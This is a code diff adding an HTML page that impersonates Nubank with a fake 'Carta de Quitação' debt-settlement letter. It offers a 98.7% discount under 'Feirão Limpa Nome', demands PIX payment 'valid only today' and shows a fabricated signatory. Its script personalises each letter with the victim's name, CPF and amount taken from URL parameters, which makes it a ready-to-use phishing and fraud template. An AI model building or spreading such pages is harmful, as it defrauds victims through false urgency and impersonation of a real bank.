@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="css/Icj6SUxGhS56.css">
+
+    <title>Carta de Quitação</title>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="./nu-roxo.png" alt="Nubank" style="height: 50px; width: auto;">
+        </div>
+
+        <h1>Carta de Quitação</h1>
+
+        <p>Na qualidade de Nubank, com base na prestação de serviços realizados ao Sr./Sra. <span id="name" class=""></span>, portador(a) do CPF <span id="cpf" class=""></span>, informamos que:</p>
+
+        <ul>
+            <li>O serviço será realizado com base no programa do Feirão Limpa Nome, onde o(a) mesmo(a) obteve um desconto de <span class="">98,7%</span> na quitação de todos os débitos em aberto.</li>
+        </ul>
+
+        <h2>Detalhes da dívida</h2>
+
+        <ul>
+            <li>Acordo: Gerido e processado pelo Nubank.</li>
+
+            <li>Valor total: R$ <span id="value" class=""></span>.</li>
+
+            <li>Forma de pagamento: PIX.</li>
+
+            <li>Acordo valido somente hoje: <span id="paymentDate" class="date-badge"></span></li>
+        </ul>
+
+        <p>Agora, depois que o Nubank recebeu o pagamento devido, em conformidade com o acima referenciado de forma de pagamento, declaro aqui a quitação completa e absoluta da dívida.</p>
+
+        <div class="signature">
+            <p>Renata Paiva de Almeida<br>Encarregada de Negociações<br>Nubank</p>
+        </div>
+
+        <p class="copyright">© 2025 Nubank. Todos os direitos reservados.</p>
+    </div>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+
+        const today = new Date();
+
+        const day = String(today.getDate()).padStart(2, '0');
+
+        const month = String(today.getMonth() + 1).padStart(2, '0');
+
+        const year = today.getFullYear();
+
+        document.getElementById('name').textContent = params.get('name');
+
+        document.getElementById('cpf').textContent = params.get('cpf');
+
+        document.getElementById('value').textContent = params.get('value');
+
+        document.getElementById('paymentDate').textContent = `${day}/${month}/${year}`;
+    </script>
+</body>
+
+</html>
